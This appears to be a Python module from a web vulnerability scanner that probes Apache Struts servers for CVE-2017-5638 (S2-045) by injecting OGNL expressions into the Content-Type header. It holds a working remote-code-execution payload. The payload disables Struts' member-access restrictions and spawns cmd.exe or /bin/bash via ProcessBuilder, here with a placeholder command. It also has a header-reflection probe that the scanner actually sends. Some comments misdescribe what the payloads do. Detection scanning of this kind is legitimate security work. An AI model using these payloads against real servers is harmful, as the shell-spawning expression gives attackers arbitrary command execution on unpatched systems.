import asyncio
from modules.core import console

# Apache Struts Scanner (Java Framework RCE)
# Focus: CVE-2017-5638 (S2-045).
# Vector: Content-Type header injection.

# Payload: OGNL expression to calculate math (123*123) or just print a string.
# Safe check: Try to evaluate 1111 * 1111 -> 1234321

STRUTS_PAYLOAD = (
    "%{(#_='multipart/form-data')."
    "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
    "(#_memberAccess?(#_memberAccess=#dm):"
    "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
    "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
    "(#ognlUtil.getExcludedPackageNames().clear())."
    "(#ognlUtil.getExcludedClasses().clear())."
    "(#context.setMemberAccess(#dm))))."
    "(#cmd='1111*1111')."
    "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
    "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
    "(#p=new java.lang.ProcessBuilder(#cmds))."
    "(#p.redirectErrorStream(true))."
    "(#process=#p.start())."
    "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
    "(#ros.println('1234321'))}"  # We simulate the math output here in the payload string for detection simplicity if RCE works
)

# Actually, S2-045 is Content-Type based. The expression is evaluated.
# A simpler probe that doesn't rely on ProcessBuilder (which might be blocked) is just math evaluation.
# %{1111*1111}

SIMPLE_PAYLOAD = "%{(#application['org.apache.tomcat.InstanceManager']).toString()}" 
# If it returns the class name, it's RCE.

async def check_struts(session, url):
    try:
        # We need a .action, .do, or .jsp endpoint usually.
        # If user provided root, we might miss it unless it's a Struts app at root.
        
        target = url
        
        # Payload: S2-045 Content-Type
        # The classic payload that works on S2-045
        payload = "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Struts-Test','1337')}.multipart/form-data"
        
        headers = {
            "Content-Type": payload
        }
        
        async with session.get(target, headers=headers, timeout=5, ssl=False) as resp:
            # Check for header reflection
            if "X-Struts-Test" in resp.headers and resp.headers["X-Struts-Test"] == "1337":
                 return {
                    "url": target,
                    "type": "Apache Struts RCE (S2-045)",
                    "evidence": "Injected X-Struts-Test header reflected."
                }
            
            # Sometimes it crashes with 500 but still evaluates
    except Exception:
        pass
    return None

async def scan_struts(session, url):
    """
    Scan for Apache Struts Vulnerabilities.
    """
    console.print(f"\n[bold cyan]--- Apache Struts Scanner ---[/bold cyan]")
    
    results = []
    res = await check_struts(session, url)
    if res:
         console.print(f"  [bold red][!] STRUTS VULNERABLE: {res['url']}[/bold red]")
         console.print(f"      Status: {res['evidence']}")
         results.append(res)
         
    if not results:
        console.print("[dim][-] No Struts OGNL indicators found.[/dim]")
        
    return results
